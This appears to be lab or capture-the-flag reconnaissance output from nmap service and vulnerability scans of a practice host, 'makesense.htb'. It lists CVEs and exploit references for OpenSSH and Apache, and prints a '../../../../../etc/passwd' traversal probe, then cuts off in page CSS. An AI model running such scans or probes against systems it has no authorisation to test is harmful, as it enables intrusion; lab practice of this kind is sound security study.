


```
nmap -sCV -T4 -A 10.129.6.91
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 14:16 -0400
Nmap scan report for 10.129.6.91
Host is up (0.24s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 27:c3:7d:10:17:3b:dc:29:cf:05:83:33:ab:28:d0:38 (ECDSA)
|_  256 a3:46:f2:d7:1f:43:41:31:35:a2:88:31:ff:2a:0b:22 (ED25519)
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=makesense.htb
| Not valid before: 2026-05-29T16:37:29
|_Not valid after:  2126-05-05T16:37:29
|_http-generator: WordPress 7.0
|_http-title: Agency LLC
8001/tcp filtered vcom-tunnel
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   256.96 ms 10.10.14.1
2   257.01 ms 10.129.6.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.92 seconds
```


```
nmap -sV --script vuln 10.129.6.91
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 14:16 -0400
Nmap scan report for 10.129.6.91
Host is up (0.26s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:9.6p1: 
|       PACKETSTORM:179290      10.0    https://vulners.com/packetstorm/PACKETSTORM:179290      *EXPLOIT*
|       1EEC8894-D2F7-547C-827C-915BE866875C    10.0    https://vulners.com/githubexploit/1EEC8894-D2F7-547C-827C-915BE866875C  *EXPLOIT*
|       09B905C6-CD97-54E6-AD97-B0DD1AC4771B    10.0    https://vulners.com/githubexploit/09B905C6-CD97-54E6-AD97-B0DD1AC4771B  *EXPLOIT*
|       33D623F7-98E0-5F75-80FA-81AA666D1340    9.8     https://vulners.com/githubexploit/33D623F7-98E0-5F75-80FA-81AA666D1340  *EXPLOIT*
|       CVE-2026-60002  9.4     https://vulners.com/cve/CVE-2026-60002
|       F8981437-1287-5B69-93F1-657DFB1DCE59    9.3     https://vulners.com/githubexploit/F8981437-1287-5B69-93F1-657DFB1DCE59  *EXPLOIT*
|       CB2926E1-2355-5C82-A42A-D4F72F114F9B    9.3     https://vulners.com/githubexploit/CB2926E1-2355-5C82-A42A-D4F72F114F9B  *EXPLOIT*
|       B6C4923E-8565-5D3E-8E68-8D182C3DAD5C    9.3     https://vulners.com/githubexploit/B6C4923E-8565-5D3E-8E68-8D182C3DAD5C  *EXPLOIT*
|       8DEE261C-33D4-5057-BA46-E4293B705BAE    9.3     https://vulners.com/githubexploit/8DEE261C-33D4-5057-BA46-E4293B705BAE  *EXPLOIT*
|       6FD8F914-B663-533D-8866-23313FD37804    9.3     https://vulners.com/githubexploit/6FD8F914-B663-533D-8866-23313FD37804  *EXPLOIT*
|       PACKETSTORM:190587      8.1     https://vulners.com/packetstorm/PACKETSTORM:190587      *EXPLOIT*
|       FB2E9ED1-43D7-585C-A197-0D6628B20134    8.1     https://vulners.com/githubexploit/FB2E9ED1-43D7-585C-A197-0D6628B20134  *EXPLOIT*
|       FA3992CE-9C4C-5350-8134-177126E0BD3F    8.1     https://vulners.com/githubexploit/FA3992CE-9C4C-5350-8134-177126E0BD3F  *EXPLOIT*
|       EFD615F0-8F17-5471-AA83-0F491FD497AF    8.1     https://vulners.com/githubexploit/EFD615F0-8F17-5471-AA83-0F491FD497AF  *EXPLOIT*
|       EDB-ID:52269    8.1     https://vulners.com/exploitdb/EDB-ID:52269      *EXPLOIT*
|       EC20B9C2-6857-5848-848A-A9F430D13EEB    8.1     https://vulners.com/githubexploit/EC20B9C2-6857-5848-848A-A9F430D13EEB  *EXPLOIT*
|       EB13CBD6-BC93-5F14-A210-AC0B5A1D8572    8.1     https://vulners.com/githubexploit/EB13CBD6-BC93-5F14-A210-AC0B5A1D8572  *EXPLOIT*
|       E543E274-C20A-582A-8F8E-F8E3F381C345    8.1     https://vulners.com/githubexploit/E543E274-C20A-582A-8F8E-F8E3F381C345  *EXPLOIT*
|       E34FCCEC-226E-5A46-9B1C-BCD6EF7D3257    8.1     https://vulners.com/githubexploit/E34FCCEC-226E-5A46-9B1C-BCD6EF7D3257  *EXPLOIT*
|       E24EEC0A-40F7-5BBC-9E4D-7B13522FF915    8.1     https://vulners.com/githubexploit/E24EEC0A-40F7-5BBC-9E4D-7B13522FF915  *EXPLOIT*
|       DC1BB99A-8B57-5EE5-9AC4-3D9D59BFC346    8.1     https://vulners.com/githubexploit/DC1BB99A-8B57-5EE5-9AC4-3D9D59BFC346  *EXPLOIT*
|       DA18D761-BB81-54B6-85CB-CFD73CE33621    8.1     https://vulners.com/githubexploit/DA18D761-BB81-54B6-85CB-CFD73CE33621  *EXPLOIT*
|       D52370EF-02EE-507D-9212-2D8EA86CBA94    8.1     https://vulners.com/githubexploit/D52370EF-02EE-507D-9212-2D8EA86CBA94  *EXPLOIT*
|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
|       CVE-2026-35386  8.1     https://vulners.com/cve/CVE-2026-35386
|       CVE-2026-35385  8.1     https://vulners.com/cve/CVE-2026-35385
|       CVE-2024-6387   8.1     https://vulners.com/cve/CVE-2024-6387
|       CFEBF7AF-651A-5302-80B8-F8146D5B33A6    8.1     https://vulners.com/githubexploit/CFEBF7AF-651A-5302-80B8-F8146D5B33A6  *EXPLOIT*
|       CA24D32D-16A8-5A49-88BF-48D7CE062E8E    8.1     https://vulners.com/githubexploit/CA24D32D-16A8-5A49-88BF-48D7CE062E8E  *EXPLOIT*
|       C6FB6D50-F71D-5870-B671-D6A09A95627F    8.1     https://vulners.com/githubexploit/C6FB6D50-F71D-5870-B671-D6A09A95627F  *EXPLOIT*
|       C623D558-C162-5D17-88A5-4799A2BEC001    8.1     https://vulners.com/githubexploit/C623D558-C162-5D17-88A5-4799A2BEC001  *EXPLOIT*
|       C5B2D4A1-8C3B-5FF7-B620-EDE207B027A0    8.1     https://vulners.com/githubexploit/C5B2D4A1-8C3B-5FF7-B620-EDE207B027A0  *EXPLOIT*
|       C185263E-3E67-5550-B9C0-AB9C15351960    8.1     https://vulners.com/githubexploit/C185263E-3E67-5550-B9C0-AB9C15351960  *EXPLOIT*
|       BDA609DA-6936-50DC-A325-19FE2CC68562    8.1     https://vulners.com/githubexploit/BDA609DA-6936-50DC-A325-19FE2CC68562  *EXPLOIT*
|       BA3887BD-F579-53B1-A4A4-FF49E953E1C0    8.1     https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0  *EXPLOIT*
|       B1F444E0-F217-5FC0-B266-EBD48589940F    8.1     https://vulners.com/githubexploit/B1F444E0-F217-5FC0-B266-EBD48589940F  *EXPLOIT*
|       92254168-3B26-54C9-B9BE-B4B7563586B5    8.1     https://vulners.com/githubexploit/92254168-3B26-54C9-B9BE-B4B7563586B5  *EXPLOIT*
|       91752937-D1C1-5913-A96F-72F8B8AB4280    8.1     https://vulners.com/githubexploit/91752937-D1C1-5913-A96F-72F8B8AB4280  *EXPLOIT*
|       90104C60-A887-5437-8521-545277685F55    8.1     https://vulners.com/githubexploit/90104C60-A887-5437-8521-545277685F55  *EXPLOIT*
|       89F96BAB-1624-51B5-B09E-E771D918D1E6    8.1     https://vulners.com/githubexploit/89F96BAB-1624-51B5-B09E-E771D918D1E6  *EXPLOIT*
|       81F0C05A-8650-5DE8-97E9-0D89F1807E5D    8.1     https://vulners.com/githubexploit/81F0C05A-8650-5DE8-97E9-0D89F1807E5D  *EXPLOIT*
|       7E218A18-4BBA-5B7D-A537-D5DC12AC1D6C    8.1     https://vulners.com/githubexploit/7E218A18-4BBA-5B7D-A537-D5DC12AC1D6C  *EXPLOIT*
|       7C7167AF-E780-5506-BEFA-02E5362E8E48    8.1     https://vulners.com/githubexploit/7C7167AF-E780-5506-BEFA-02E5362E8E48  *EXPLOIT*
|       79FE1ED7-EB3D-5978-A12E-AAB1FFECCCAC    8.1     https://vulners.com/githubexploit/79FE1ED7-EB3D-5978-A12E-AAB1FFECCCAC  *EXPLOIT*
|       795762E3-BAB4-54C6-B677-83B0ACC2B163    8.1     https://vulners.com/githubexploit/795762E3-BAB4-54C6-B677-83B0ACC2B163  *EXPLOIT*
|       774022BB-71DA-57C4-9B8F-E21D667DE4BC    8.1     https://vulners.com/githubexploit/774022BB-71DA-57C4-9B8F-E21D667DE4BC  *EXPLOIT*
|       743E5025-3BB8-5EC4-AC44-2AA679730661    8.1     https://vulners.com/githubexploit/743E5025-3BB8-5EC4-AC44-2AA679730661  *EXPLOIT*
|       73A19EF9-346D-5B2B-9792-05D9FE3414E2    8.1     https://vulners.com/githubexploit/73A19EF9-346D-5B2B-9792-05D9FE3414E2  *EXPLOIT*
|       6E81EAE5-2156-5ACB-9046-D792C7FAF698    8.1     https://vulners.com/githubexploit/6E81EAE5-2156-5ACB-9046-D792C7FAF698  *EXPLOIT*
|       6B78D204-22B0-5D11-8A0C-6313958B473F    8.1     https://vulners.com/githubexploit/6B78D204-22B0-5D11-8A0C-6313958B473F  *EXPLOIT*
|       65650BAD-813A-565D-953D-2E7932B26094    8.1     https://vulners.com/githubexploit/65650BAD-813A-565D-953D-2E7932B26094  *EXPLOIT*
|       649197A2-0224-5B5C-9C4E-B5791D42A9FB    8.1     https://vulners.com/githubexploit/649197A2-0224-5B5C-9C4E-B5791D42A9FB  *EXPLOIT*
|       61DDEEE4-2146-5E84-9804-B780AA73E33C    8.1     https://vulners.com/githubexploit/61DDEEE4-2146-5E84-9804-B780AA73E33C  *EXPLOIT*
|       608FA50C-AEA1-5A83-8297-A15FC7D32A7C    8.1     https://vulners.com/githubexploit/608FA50C-AEA1-5A83-8297-A15FC7D32A7C  *EXPLOIT*
|       5D2CB1F8-DC04-5545-8BC7-29EE3DA8890E    8.1     https://vulners.com/githubexploit/5D2CB1F8-DC04-5545-8BC7-29EE3DA8890E  *EXPLOIT*
|       5C81C5C1-22D4-55B3-B843-5A9A60AAB6FD    8.1     https://vulners.com/githubexploit/5C81C5C1-22D4-55B3-B843-5A9A60AAB6FD  *EXPLOIT*
|       53BCD84F-BD22-5C9D-95B6-4B83627AB37F    8.1     https://vulners.com/githubexploit/53BCD84F-BD22-5C9D-95B6-4B83627AB37F  *EXPLOIT*
|       4FB01B00-F993-5CAF-BD57-D7E290D10C1F    8.1     https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F  *EXPLOIT*
|       48603E8F-B170-57EE-85B9-67A7D9504891    8.1     https://vulners.com/githubexploit/48603E8F-B170-57EE-85B9-67A7D9504891  *EXPLOIT*
|       4748B283-C2F6-5924-8241-342F98EEC2EE    8.1     https://vulners.com/githubexploit/4748B283-C2F6-5924-8241-342F98EEC2EE  *EXPLOIT*
|       452ADB71-199C-561E-B949-FCDE6288B925    8.1     https://vulners.com/githubexploit/452ADB71-199C-561E-B949-FCDE6288B925  *EXPLOIT*
|       331B2B7F-FB25-55DB-B7A4-602E42448DB7    8.1     https://vulners.com/githubexploit/331B2B7F-FB25-55DB-B7A4-602E42448DB7  *EXPLOIT*
|       2AB4EF50-4ADC-5240-8795-A68B64A7A43B    8.1     https://vulners.com/githubexploit/2AB4EF50-4ADC-5240-8795-A68B64A7A43B  *EXPLOIT*
|       1FFDA397-F480-5C74-90F3-060E1FE11B2E    8.1     https://vulners.com/githubexploit/1FFDA397-F480-5C74-90F3-060E1FE11B2E  *EXPLOIT*
|       1FA2B3DD-FC8F-5602-A1C9-2CF3F9536563    8.1     https://vulners.com/githubexploit/1FA2B3DD-FC8F-5602-A1C9-2CF3F9536563  *EXPLOIT*
|       1F7A6000-9E6D-511C-B0F6-7CADB7200761    8.1     https://vulners.com/githubexploit/1F7A6000-9E6D-511C-B0F6-7CADB7200761  *EXPLOIT*
|       1CF00BB8-B891-5347-A2DC-2C6A6BFF7C99    8.1     https://vulners.com/githubexploit/1CF00BB8-B891-5347-A2DC-2C6A6BFF7C99  *EXPLOIT*
|       1AB9F1F4-9798-59A0-9213-1D907E81E7F6    8.1     https://vulners.com/githubexploit/1AB9F1F4-9798-59A0-9213-1D907E81E7F6  *EXPLOIT*
|       179F72B6-5619-52B5-A040-72F1ECE6CDD8    8.1     https://vulners.com/githubexploit/179F72B6-5619-52B5-A040-72F1ECE6CDD8  *EXPLOIT*
|       15C36683-070A-5CC1-B21F-5F0BF974D9D3    8.1     https://vulners.com/githubexploit/15C36683-070A-5CC1-B21F-5F0BF974D9D3  *EXPLOIT*
|       1337DAY-ID-39674        8.1     https://vulners.com/zdt/1337DAY-ID-39674        *EXPLOIT*
|       11F020AC-F907-5606-8805-0516E06160EE    8.1     https://vulners.com/githubexploit/11F020AC-F907-5606-8805-0516E06160EE  *EXPLOIT*
|       0FC4BE81-312B-51F4-9D9B-66D8B5C093CD    8.1     https://vulners.com/githubexploit/0FC4BE81-312B-51F4-9D9B-66D8B5C093CD  *EXPLOIT*
|       0B165049-2374-5E2A-A27C-008BEA3D13F7    8.1     https://vulners.com/githubexploit/0B165049-2374-5E2A-A27C-008BEA3D13F7  *EXPLOIT*
|       08144020-2B5F-5EB9-9286-1ABD5477278E    8.1     https://vulners.com/githubexploit/08144020-2B5F-5EB9-9286-1ABD5477278E  *EXPLOIT*
|       CVE-2026-60000  7.5     https://vulners.com/cve/CVE-2026-60000
|       CVE-2026-59999  7.5     https://vulners.com/cve/CVE-2026-59999
|       CVE-2024-39894  7.5     https://vulners.com/cve/CVE-2024-39894
|       PACKETSTORM:189283      6.8     https://vulners.com/packetstorm/PACKETSTORM:189283      *EXPLOIT*
|       CVE-2025-26465  6.8     https://vulners.com/cve/CVE-2025-26465
|       9D8432B9-49EC-5F45-BB96-329B1F2B2254    6.8     https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254  *EXPLOIT*
|       85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0    6.8     https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0  *EXPLOIT*
|       1337DAY-ID-39918        6.8     https://vulners.com/zdt/1337DAY-ID-39918        *EXPLOIT*
|       CVE-2026-60001  6.5     https://vulners.com/cve/CVE-2026-60001
|       CVE-2026-59998  6.5     https://vulners.com/cve/CVE-2026-59998
|       CVE-2026-35387  6.5     https://vulners.com/cve/CVE-2026-35387
|       CVE-2025-26466  5.9     https://vulners.com/cve/CVE-2025-26466
|       BA7AC73B-AD50-5056-88E4-49E135337993    5.9     https://vulners.com/githubexploit/BA7AC73B-AD50-5056-88E4-49E135337993  *EXPLOIT*
|       B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF    5.9     https://vulners.com/githubexploit/B96EAFCA-CE3F-51B0-86CF-4EB92B1C4FEF  *EXPLOIT*
|       CVE-2026-59997  5.4     https://vulners.com/cve/CVE-2026-59997
|       CVE-2026-59996  5.4     https://vulners.com/cve/CVE-2026-59996
|       CVE-2026-59995  5.4     https://vulners.com/cve/CVE-2026-59995
|       CVE-2025-32728  4.3     https://vulners.com/cve/CVE-2025-32728
|       CVE-2025-61985  3.6     https://vulners.com/cve/CVE-2025-61985
|       CVE-2025-61984  3.6     https://vulners.com/cve/CVE-2025-61984
|       B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150    3.6     https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150  *EXPLOIT*
|       4C6E2182-0E99-5626-83F6-1646DD648C57    3.6     https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57  *EXPLOIT*
|_      CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58 ((Ubuntu))
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: 
|   cpe:/a:apache:http_server:2.4.58: 
|       CVE-2026-44631  9.8     https://vulners.com/cve/CVE-2026-44631
|       CVE-2026-29167  9.8     https://vulners.com/cve/CVE-2026-29167
|       CVE-2026-28780  9.8     https://vulners.com/cve/CVE-2026-28780
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
|       PACKETSTORM:213257      9.1     https://vulners.com/packetstorm/PACKETSTORM:213257      *EXPLOIT*
|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F  *EXPLOIT*
|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7  *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45  *EXPLOIT*
|       CVE-2026-42535  9.1     https://vulners.com/cve/CVE-2026-42535
|       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
|       CVE-2026-24072  8.8     https://vulners.com/cve/CVE-2026-24072
|       40379BCA-07F4-5401-B618-4640793D350D    8.8     https://vulners.com/githubexploit/40379BCA-07F4-5401-B618-4640793D350D  *EXPLOIT*
|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
|       EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7    7.5     https://vulners.com/githubexploit/EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7  *EXPLOIT*
|       CVE-2026-49975  7.5     https://vulners.com/cve/CVE-2026-49975
|       CVE-2026-42536  7.5     https://vulners.com/cve/CVE-2026-42536
|       CVE-2026-34356  7.5     https://vulners.com/cve/CVE-2026-34356
|       CVE-2026-34355  7.5     https://vulners.com/cve/CVE-2026-34355
|       CVE-2026-34059  7.5     https://vulners.com/cve/CVE-2026-34059
|       CVE-2026-29169  7.5     https://vulners.com/cve/CVE-2026-29169
|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
|       CVE-2025-55753  7.5     https://vulners.com/cve/CVE-2025-55753
|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
|       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CNVD-2025-30837 7.5     https://vulners.com/cnvd/CNVD-2025-30837
|       CNVD-2025-30836 7.5     https://vulners.com/cnvd/CNVD-2025-30836
|       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
|       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
|       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
|       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
|       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
|       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
|       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
|       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
|       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
|       C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A    7.5     https://vulners.com/githubexploit/C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A  *EXPLOIT*
|       A5675239-3520-5F86-A975-8C0FBB77C2A9    7.5     https://vulners.com/githubexploit/A5675239-3520-5F86-A975-8C0FBB77C2A9  *EXPLOIT*
|       742112F7-4755-5E94-8DD2-899160B59E5E    7.5     https://vulners.com/githubexploit/742112F7-4755-5E94-8DD2-899160B59E5E  *EXPLOIT*
|       5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085    7.5     https://vulners.com/githubexploit/5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085  *EXPLOIT*
|       4B051C78-13E6-52F9-A39E-4C7E49ACB51A    7.5     https://vulners.com/githubexploit/4B051C78-13E6-52F9-A39E-4C7E49ACB51A  *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
|       0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8    7.5     https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8  *EXPLOIT*
|       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
|       CVE-2026-48913  7.3     https://vulners.com/cve/CVE-2026-48913
|       CVE-2026-44186  7.3     https://vulners.com/cve/CVE-2026-44186
|       CVE-2026-44185  7.3     https://vulners.com/cve/CVE-2026-44185
|       CVE-2026-29168  7.3     https://vulners.com/cve/CVE-2026-29168
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       CVE-2026-43951  6.5     https://vulners.com/cve/CVE-2026-43951
|       CVE-2026-33523  6.5     https://vulners.com/cve/CVE-2026-33523
|       CVE-2025-65082  6.5     https://vulners.com/cve/CVE-2025-65082
|       CNVD-2025-30833 6.5     https://vulners.com/cnvd/CNVD-2025-30833
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
|       CVE-2026-29170  6.1     https://vulners.com/cve/CVE-2026-29170
|       CVE-2026-44119  5.5     https://vulners.com/cve/CVE-2026-44119
|       CVE-2025-66200  5.4     https://vulners.com/cve/CVE-2025-66200
|       CVE-2024-36387  5.4     https://vulners.com/cve/CVE-2024-36387
|       CNVD-2025-30835 5.4     https://vulners.com/cnvd/CNVD-2025-30835
|       CNVD-2024-36392 5.4     https://vulners.com/cnvd/CNVD-2024-36392
|       CVE-2026-34032  5.3     https://vulners.com/cve/CVE-2026-34032
|       CVE-2026-33857  5.3     https://vulners.com/cve/CVE-2026-33857
|       CVE-2026-33007  5.3     https://vulners.com/cve/CVE-2026-33007
|       EA6ADD14-D80B-5DC2-9991-1F9663E2D09F    4.8     https://vulners.com/githubexploit/EA6ADD14-D80B-5DC2-9991-1F9663E2D09F  *EXPLOIT*
|       CVE-2026-33006  4.8     https://vulners.com/cve/CVE-2026-33006
|_      74A7BA4E-D496-587B-A72A-FA0BE663F994    0.0     https://vulners.com/githubexploit/74A7BA4E-D496-587B-A72A-FA0BE663F994  *EXPLOIT*
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <!DOCTYPE html>
|   <html lang="en-US">
|   <head>
|       <meta charset="UTF-8">
|       <meta name="viewport" content="width=device-width, initial-scale=1.0">
|       <title>Agency LLC</title>
|   <meta name='robots' content='noindex, nofollow' />
|   <link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
|   <link rel='dns-prefetch' href='//makesense.htb' />
|   <style id="wp-img-auto-sizes-contain-inline-css">
|   img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
|   /*# sourceURL=wp-img-auto-sizes-contain-inline-css */
|   </style>
|   <style id="wp-emoji-styles-inline-css">
|   
|       img.wp-smiley, img.emoji {
|               display: inline !important;
|               border: none !important;
|               box-shadow: none !important;
|               height: 1em !important;
|               width: 1em !important;
|               margin: 0 0.07em !important;
|               vertical-align: -0.1em !important;
|               background: none !important;
|               padding: 0 !important;
|       }
|   /*# sourceURL=wp-emoji-styles-inline-css */
|   </style>
|   <style id="wp-block-library-inline-css">
|   :root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style*=border-color]){border-style:solid}html :where([style*=border-top-color]){border-top-style:solid}html :where([style*=border-right-color]){border-right-style:solid}html 